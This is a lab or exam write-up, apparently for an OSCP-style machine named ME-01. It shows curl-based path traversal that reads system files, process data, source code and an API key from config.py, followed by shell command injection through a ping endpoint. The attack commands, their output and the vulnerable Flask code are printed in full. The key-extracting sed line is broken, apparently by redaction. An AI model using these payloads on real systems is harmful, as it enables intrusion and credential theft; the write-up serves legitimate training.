---
type: machine-phase
project: OSCP-Exam-PoC
machine: ME-01
difficulty: Medium
phase: initial-access
status: completed
initial_user: svc
initial_access: Path Traversal
target: x.x.x.x
http_port: PORT_I
flag_path: /home/svc/user.txt
credential_discovery: API Key Disclosure
remote_execution: OS Command Injection
uid: 1000
gid: 1000
application: IT GATE File Service
server: Gunicorn
backend: Python / Flask
flag_submitted: true
tags:
  - oscp
  - me-01
  - initial-access
  - path-traversal
  - lfi
  - arbitrary-file-read
  - api-key
  - command-injection
  - python
  - curl
---

# ME-01 — User Foothold

> **Flag completion:** User flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

The examination required:

> Start ME-01 from the Machines page, attack the assigned instance, gain user-level access, and submit the contents of `user.txt`.

The initial-access chain consisted of several connected weaknesses:

1. Path traversal in the file-download endpoint.
    
2. Arbitrary file disclosure.
    
3. Disclosure of application source and configuration.
    
4. Recovery of an API authentication key.
    
5. OS command injection in the authenticated diagnostics endpoint.
    
6. Remote command execution as the Linux account `svc`.
    

The user-level objective was completed successfully.

## 2. Target Information

|Property|Value|
|---|---|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_I`|
|Application|IT GATE File Service|
|Web Server|Gunicorn|
|Backend|Python / Flask|
|Download Endpoint|`/api/download`|
|Diagnostics Endpoint|`/api/ping`|
|File Parameter|`file`|
|Diagnostics Parameter|`host`|
|Authentication Header|`X-API-Key`|
|Initial Linux Account|`svc`|
|UID/GID|`1000:1000`|
|User Flag Path|`/home/svc/user.txt`|

Base URL:

```
http://x.x.x.x:PORT_I
```

## 3. Initial Reconnaissance

### 3.1 Application Landing Page

The application exposed the following functionality:

```
IT GATE File Service

Download files from the public share:

GET /api/download?file=welcome.txt

GET /api/ping?host=1.1.1.1
(internal diagnostics — requires X-API-Key)
```

Two attack surfaces were identified.

|Endpoint|Function|Initial Hypothesis|
|---|---|---|
|`/api/download?file=`|Download files|Path traversal / arbitrary file read|
|`/api/ping?host=`|Internal diagnostics|Potential command injection or SSRF|

The download endpoint was unauthenticated, making it the logical starting point.

### 3.2 Initial Network Interference

The first direct Kali request was:

```
curl -i 'http://x.x.x.x:PORT_I/api/download?file=welcome.txt'
```

Instead of reaching the application, the ISP returned:

```
HTTP/1.1 307 Temporary Redirect
Via: 1.0 middlebox
Location: http://megaplusredirection.tedata.net/VDSL-Redirection_100.html
Connection: close
```

**Finding:** An intermediary on the normal network path redirected the HTTP request.

I had previously confirmed that the browser VPN worked, while terminal traffic was still affected.

The existing Academy OpenVPN configuration was inspected. It used split routing:

```
10.10.8.0/22
10.10.16.0/23
10.10.110.0/24
10.13.37.0/24
10.13.38.0/24
10.129.0.0/16
```

The default route remained through:

```
192.168.73.2 dev eth0
```

The initial route to the public examination server therefore used the ordinary network path rather than the Academy tunnel.

### 3.3 Burp Suite vs. curl

Burp Suite was initially considered for request interception and modification.

However, the combination of the existing VPN setup and packet-capture routing made Burp impractical in this particular environment.

I contacted the instructor, demonstrated the situation, and received approval to use curl.

This led to an important operational decision:

**Do not depend on Burp Suite as the only way to perform HTTP testing.**

The investigation continued using curl, with explicit examination of request parameters, headers, encoding, and response bodies.

After the VPN/network issue was addressed, the baseline request succeeded.

### 3.4 Successful Baseline Request

Command:

```
curl -i 'http://x.x.x.x:PORT_I/api/download?file=welcome.txt'
```

Captured response:

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 04 Nov 2026 19:22:47 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 161
```

Body:

```
Welcome to the IT GATE file share.

Place public downloads in this directory. The download endpoint serves files
from here, e.g.  /api/download?file=welcome.txt
```

Important observations:

- HTTP status was `200 OK`.
    
- Gunicorn was disclosed as the application server.
    
- The response used `application/octet-stream`.
    
- The application returned file contents directly.
    

## 4. Path Traversal Exploitation

### 4.1 Understand the Download Endpoint

The parameter:

```
file
```

controlled which file the application attempted to retrieve.

The intended behavior was to serve files from the public share.

The vulnerability hypothesis was that the application did not properly restrict the resolved file path to that directory.

### 4.2 First Traversal Test

The first target was:

```
/etc/passwd
```

Command:

```
curl -i --get \
  --data-urlencode 'file=../../../../etc/passwd' \
  'http://x.x.x.x:PORT_I/api/download'
```

Parameter breakdown:

|Component|Purpose|
|---|---|
|`curl`|HTTP client|
|`-i`|Include response headers|
|`--get`|Put the supplied data into the URL query string|
|`--data-urlencode`|URL-encode the parameter value|
|`file=...`|Specify the requested filesystem path|
|`/api/download`|Target the file-download endpoint|

The resulting request resembled:

```
GET /api/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
```

### 4.3 Arbitrary File Read Confirmed

Captured response:

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 04 Nov 2026 19:23:49 GMT
Connection: close
Content-Type: application/octet-stream
Content-Length: 876
```

The returned contents included:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:13:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
svc:x:1000:1000::/home/svc:/bin/bash
```

**Finding:** Arbitrary file read was confirmed.

The most important account was:

```
svc:x:1000:1000::/home/svc:/bin/bash
```

This revealed:

|Property|Value|
|---|---|
|Username|`svc`|
|UID|`1000`|
|GID|`1000`|
|Home Directory|`/home/svc`|
|Login Shell|`/bin/bash`|

### 4.4 Retrieve the User Flag

Based on the examination's flag-location convention and the discovered home directory, the target was:

```
/home/svc/user.txt
```

The request used was:

```
curl -i --get \
  --data-urlencode 'file=../../../../home/svc/user.txt' \
  'http://x.x.x.x:PORT_I/api/download'
```

I reported that the file was retrieved successfully before moving to the privilege-escalation objective.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

See [[Difficulty Levels/Medium/ME-01/user]].

## 5. Process and Application Enumeration Through File Read

Once arbitrary file read was established, the next objective was to understand the application process and identify where its authentication configuration was stored.

### 5.1 Test Direct Root Flag Access

An initial attempt requested:

```
/root/root.txt
```

Command:

```
curl -i --get \
  --data-urlencode 'file=../../../../root/root.txt' \
  'http://x.x.x.x:PORT_I/api/download'
```

Response:

```
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 207
```

The application returned its standard 404 page.

**Interpretation:** Direct root-flag retrieval was unsuccessful.

The response alone did not establish whether the file was absent, inaccessible, or whether the application translated an underlying filesystem error into HTTP 404.

The investigation therefore continued toward the authenticated diagnostics endpoint.

### 5.2 Inspect the Process Environment

The `/proc` filesystem exposes information about running processes.

The following pseudo-file was requested:

```
/proc/self/environ
```

Command:

```
curl -sS --get \
  --data-urlencode 'file=../../../../proc/self/environ' \
  'http://x.x.x.x:PORT_I/api/download' |
  tr '\0' '\n'
```

Captured output:

```
MAIL=/var/mail/svc
USER=svc
HOSTNAME=medium
HOME=/home/svc
OLDPWD=/opt/svcapp
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_SHA256=9120e0a653868f6e3698d36cdd99e5a58903ec9469e448f21d98f7b16d8fa290
LOGNAME=svc
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
SHELL=/bin/sh
PYTHON_VERSION=3.11.18
PWD=/opt/svcapp
```

No obvious application API key was present in the environment.

The presence of `GPG_KEY`, `PYTHON_SHA256`, and `PYTHON_VERSION` prompted a hypothesis that `GPG_KEY` might be the API key under a different name.

That hypothesis was rejected after inspecting the actual application source.

The important environment findings were:

```
USER=svc
HOSTNAME=medium
HOME=/home/svc
PWD=/opt/svcapp
PYTHON_VERSION=3.11.18
```

### Why `tr` was necessary

`/proc/self/environ` separates environment variables using NULL bytes rather than ordinary newline characters.

This part:

```
tr '\0' '\n'
```

converts those NULL separators into readable newlines.

### 5.3 Inspect the Process Command Line

The next pseudo-file was:

```
/proc/self/cmdline
```

Command:

```
curl -sS --get \
  --data-urlencode 'file=../../../../proc/self/cmdline' \
  'http://x.x.x.x:PORT_I/api/download' |
  tr '\0' ' '
```

Captured output:

```
/usr/local/bin/python3.11 /usr/local/bin/gunicorn --access-logfile - -w 2 -b 0.0.0.0:5000 app:app
```

Interpretation:

|Argument|Meaning|
|---|---|
|`/usr/local/bin/python3.11`|Python interpreter|
|`/usr/local/bin/gunicorn`|WSGI application server|
|`--access-logfile -`|Write access logs to stdout|
|`-w 2`|Start two workers|
|`-b 0.0.0.0:5000`|Bind to all interfaces on port 5000|
|`app:app`|Import the `app` object from the `app` module|

Combining this with the previously retrieved working directory:

```
PWD=/opt/svcapp
```

provided a specific source-code target:

```
/opt/svcapp/app.py
```

### 5.4 Verify Authentication Enforcement

Before attempting to exploit the diagnostics endpoint, an unauthenticated request was sent:

```
curl -i --get \
  --data-urlencode 'host=1.1.1.1' \
  'http://x.x.x.x:PORT_I/api/ping'
```

Response:

```
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 317
```

This established that the diagnostics endpoint enforced an authentication requirement.

At this point:

- The endpoint existed.
    
- The endpoint rejected unauthenticated requests.
    
- The API key had not yet been recovered.
    
- Command injection had not yet been demonstrated.
    

## 6. Application Source Code Disclosure

### 6.1 Retrieve app.py

The Gunicorn command line and process working directory identified the application source file.

Request:

```
curl -i --get \
  --data-urlencode 'file=../../../../opt/svcapp/app.py' \
  'http://x.x.x.x:PORT_I/api/download'
```

The file was returned successfully.

### 6.2 Important Source Code

Imports:

```
import os
import subprocess

from flask import Flask, request, Response, abort

from config import API_KEY
```

Application directories:

```
app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))
PUBLIC = os.path.join(BASE, "public")
```

File-download implementation:

```
@app.route("/api/download")
def download():
    f = request.args.get("file", "")
    path = os.path.join(PUBLIC, f)

    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except OSError:
        abort(404)

    return Response(data, mimetype="application/octet-stream")
```

The missing security control was path containment validation.

User-controlled input was joined to the public-share directory without verifying that the resulting path remained within the intended directory.

### 6.3 Source Code Reveals the Command Injection

The diagnostics endpoint contained:

```
@app.route("/api/ping")
def ping():
    if request.headers.get("X-API-Key") != API_KEY:
        abort(401)

    host = request.args.get("host", "")

    out = subprocess.getoutput("ping -c 1 -W 1 " + host)

    return Response(out, mimetype="text/plain")
```

The critical line:

```
subprocess.getoutput("ping -c 1 -W 1 " + host)
```

The application:

1. Reads `host` directly from the request.
    
2. Concatenates it into a shell command.
    
3. Executes the resulting command through `subprocess.getoutput()`.
    

No safe argument separation or input validation was used.

This confirmed OS command injection in the source code.

### 6.4 The GPG_KEY Hypothesis

My hypothesis was that:

```
GPG_KEY=A0358C...
```

might be the diagnostics API key under a different name.

This hypothesis was plausible because the diagnostics endpoint required an authentication secret and the environment contained a key-like variable.

However, source code provided stronger evidence:

```
from config import API_KEY
```

The application explicitly imported `API_KEY` from a separate module.

The environment also contained Python image-related variables, making `GPG_KEY` more consistent with the Python runtime environment than with application authentication.

**Conclusion:** The API key was stored in application configuration, not established to be the `GPG_KEY` environment variable.

## 7. API-Key Recovery

### 7.1 Identify config.py

The source import:

```
from config import API_KEY
```

identified the configuration file:

```
/opt/svcapp/config.py
```

Because the public directory was:

```
/opt/svcapp/public
```

only one parent-directory traversal was needed.

Request:

```
curl -i --get \
  --data-urlencode 'file=../config.py' \
  'http://x.x.x.x:PORT_I/api/download'
```

### 7.2 Captured Configuration

Response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: application/octet-stream
Content-Length: 133
```

Body:

```
# Internal service configuration.
# NOTE: do not expose this file publicly.
API_KEY = "REDACTED_EXAMPLE_KEY"
DEBUG = False
```

The API key was now recovered directly from the configuration file.

### 7.3 Initial Authentication Failure

The first manually constructed requests returned:

```
HTTP/1.1 401 UNAUTHORIZED
```

A verbose curl request confirmed that the `X-API-Key` header was being sent.

The exact cause of the manual authentication mismatch was not independently isolated.

Rather than continue manually copying the key, the investigation switched to extracting it directly from the recovered configuration.

### 7.4 Extract the Key Automatically

The working command was:

```
BASE='http://x.x.x.x:PORT_I'

API_KEY=$(curl -fsS --get \
  --data-urlencode 'file=../config.py' \
  "$BASE/api/download" |
  sed -n 's/^API_KEY = "REDACTED_EXAMPLE_KEY"$/\1/p')
```

Then:

```
printf 'Extracted key length: %s characters\n' "${#API_KEY}"
```

Captured output:

```
Extracted key length: 30
```

This eliminated manual transcription from the authentication workflow.

## 8. Authenticate to the Diagnostics Endpoint

A normal ping request was performed first, without command injection.

Command:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=1.1.1.1' \
  "$BASE/api/ping"
```

Explanation:

|Component|Purpose|
|---|---|
|`-i`|Display response headers and body|
|`--get`|Send the parameter in the URL query string|
|`-H`|Add the API authentication header|
|`$API_KEY`|Expand the recovered key|
|`--data-urlencode`|Encode the `host` query parameter|

Captured response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/plain; charset=utf-8
Content-Length: 241
```

Body:

```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=55 time=4.28 ms

--- 1.1.1.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.277/4.277/4.277/0.000 ms
```

**Finding:** API authentication succeeded.

The application accepted the recovered key and executed the intended diagnostics operation.

## 9. Remote Command Execution

### 9.1 Demonstrate Command Injection

With authentication working, the next test appended a harmless identity command to the `host` parameter.

Command:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; id' \
  "$BASE/api/ping"
```

The application effectively constructed:

```
ping -c 1 -W 1 127.0.0.1; id
```

The semicolon separated two shell commands:

1. The intended ping operation.
    
2. The supplied `id` command.
    

### 9.2 Captured Output

Response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/plain; charset=utf-8
Content-Length: 295
```

Body:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.220 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.220/0.220/0.220/0.000 ms
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

This confirmed remote operating-system command execution.

Execution identity:

```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

The service was executing injected commands as `svc`.

<badge color="success">Initial access chain confirmed</badge>

## 10. Attack Chain Summary

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/me-01-user-attack-chain-mobile.svg" />
    <img src="/diagrams/me-01-user-attack-chain.svg" alt="All 15 stages of ME-01 User: file service and /api/download path traversal, /etc/passwd account identification, /proc/self/cmdline and app.py disclosure, config.API_KEY discovery and configuration read, API key extraction, X-API-Key authentication, /api/ping host command injection and confirmed remote command execution as svc." width="760" height="2245" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 15 original steps are retained, including process inspection and configuration disclosure. The separate user-flag objective was completed through arbitrary file read of <code>/home/svc/user.txt</code> (participant-confirmed); no API-key or flag values are reproduced.</figcaption>
</figure>

## 11. Technical Findings

|Finding ID|Finding|Evidence|Result|
|---|---|---|---|
|ME-01-U01|Unrestricted file-download path|Application behavior|Path traversal suspected|
|ME-01-U02|Arbitrary file read|`/etc/passwd` returned successfully|Confirmed|
|ME-01-U03|Linux account disclosure|`svc:x:1000:1000`|Identified service account|
|ME-01-U04|Process information disclosure|`/proc/self/environ`|Environment recovered|
|ME-01-U05|Application process disclosure|`/proc/self/cmdline`|Gunicorn invocation recovered|
|ME-01-U06|Source code disclosure|`/opt/svcapp/app.py`|Application logic recovered|
|ME-01-U07|Configuration disclosure|`/opt/svcapp/config.py`|API key recovered|
|ME-01-U08|Authentication enforcement|Unauthenticated request returned 401|Confirmed|
|ME-01-U09|Authenticated diagnostics|Normal ping request returned 200|Confirmed|
|ME-01-U10|OS command injection|`subprocess.getoutput()` concatenation|Confirmed|
|ME-01-U11|Remote command execution|`id` output as `svc`|Confirmed|
|ME-01-U12|User flag retrieval|`/home/svc/user.txt`| Obtained and submitted (participant-confirmed) |

## 12. Difficulties and Lessons

### 12.1 ISP HTTP Interception

**Problem:** The first curl request received an HTTP 307 redirect from an ISP middlebox.

**Evidence:**

```
Via: 1.0 middlebox
Location: http://megaplusredirection.tedata.net/VDSL-Redirection_100.html
```

**Impact:** Terminal HTTP requests could not initially reach the examination application.

**Resolution:** The network/VPN setup was adjusted until curl could reach the target.

The exact causal attribution beyond the observed intermediary redirect was not independently established.

### 12.2 Burp Suite Was Not Practical

My existing VPN setup complicated the use of Burp Proxy.

After discussing the situation with the instructor, curl was used instead.

**Lesson:** A pentester must understand how to create, modify, and replay HTTP requests independently of a graphical interception proxy.

### 12.3 API Key Transcription

The first manually supplied keys returned 401.

The successful solution extracted the key from the exposed configuration file using curl and sed.

**Lesson:** Automating secret extraction avoids avoidable transcription errors.

### 12.4 Canary False Lead

The application contained a build-token canary.

It was identified as a decoy rather than a valid flag.

**Lesson:** A value that resembles a flag is not evidence that it is the actual examination objective.

### 12.5 Source Code Changed the Investigation

Instead of guessing the behavior of the diagnostics endpoint, the application source was recovered and inspected.

This established both the location of the API key and the exact command-injection vulnerability.

**Lesson:** When source code is exposed, inspect it before developing speculative payloads.

## 13. Evidence Register

|Evidence ID|Description|Status|
|---|---|---|
|ME-01-U01|Application landing page|Recorded|
|ME-01-U02|Welcome file response|Recorded|
|ME-01-U03|ISP 307 redirect|Recorded|
|ME-01-U04|Successful `/etc/passwd` traversal|Recorded|
|ME-01-U05|`svc` account discovery|Confirmed|
|ME-01-U06|User flag path|Identified|
|ME-01-U07|User flag retrieval| Obtained and submitted (participant-confirmed) |
|ME-01-U08|`/proc/self/environ`|Recorded|
|ME-01-U09|`/proc/self/cmdline`|Recorded|
|ME-01-U10|`app.py` source|Recorded|
|ME-01-U11|`config.py` contents|Recorded|
|ME-01-U12|API authentication 401|Recorded|
|ME-01-U13|Successful API key extraction|Recorded|
|ME-01-U14|Normal diagnostics request|HTTP 200 recorded|
|ME-01-U15|Command injection request|Recorded|
|ME-01-U16|`id` output as `svc`|Confirmed|
|ME-01-U17| Flag outcome | Obtained and submitted (participant-confirmed) |

## 14. Lessons Learned

1. **Analyze the application before attacking blindly.** The initial endpoint description and later source code established the exact processing behavior.
    
2. **A file-download feature can become an arbitrary-file-read primitive.** The absence of filesystem path containment enabled traversal.
    
3. **Linux** `**/proc**` **provides useful process intelligence.** Environment variables and command-line arguments helped identify the application structure.
    
4. **Do not mistake runtime variables for application secrets.** `GPG_KEY` looked relevant but the source identified `config.API_KEY` as the actual authentication mechanism.
    
5. **Configuration files are part of the attack surface.** Recovering `config.py` exposed the key protecting the internal diagnostics endpoint.
    
6. **Authentication checks must be evaluated separately from input handling.** A 401 response meant the command-injection test had not yet reached the vulnerable code.
    
7. **Use programmatic extraction when handling sensitive values.** The curl and sed pipeline resolved the API-key handling problem cleanly.
    
8. **Understand shell interpretation.** `subprocess.getoutput()` executes a command through a shell, making untrusted string concatenation dangerous.
    
9. **Verify the execution identity.** The `id` output established that the command injection ran as `svc`, UID 1000.
    
10. **Keep the user and root phases separate.** The initial-access phase ended once `svc` command execution and user-flag completion were established. The capability-based root escalation belongs in [[Difficulty Levels/Medium/ME-01/root]].
    

## 15. Related Documentation

- [[ME-01 Overview]]
    
- [[Difficulty Levels/Medium/ME-01/root]]
    
- [[Methodology/Web Enumeration]]
    
- [[Methodology/Initial Access]]
    
- [[Methodology/Evidence Collection]]
    
- [[Difficulties & Lessons/Network and ISP Restrictions]]
    
- [[HTTP Client and Connectivity Failures]]
    

## 16. Completion Checklist

- Target application identified
    
- HTTP download endpoint inspected
    
- Network redirection documented
    
- curl workflow established
    
- Path traversal confirmed
    
- Linux account discovered
    
- User flag path identified
    
- User flag retrieved and submitted
    
- Process environment inspected
    
- Gunicorn command line recovered
    
- Application source recovered
    
- API-key configuration recovered
    
- API authentication established
    
- Command injection confirmed
    
- Remote execution as `svc` confirmed
    
- Raw user flag response attached
    
- Original HTTP requests and screenshots attached
    

**Phase result:** Initial access and user-level objective completed. The confirmed execution context was `svc` (UID 1000). Privilege escalation through `CAP_SETUID` is documented separately in [[Difficulty Levels/Medium/ME-01/root]].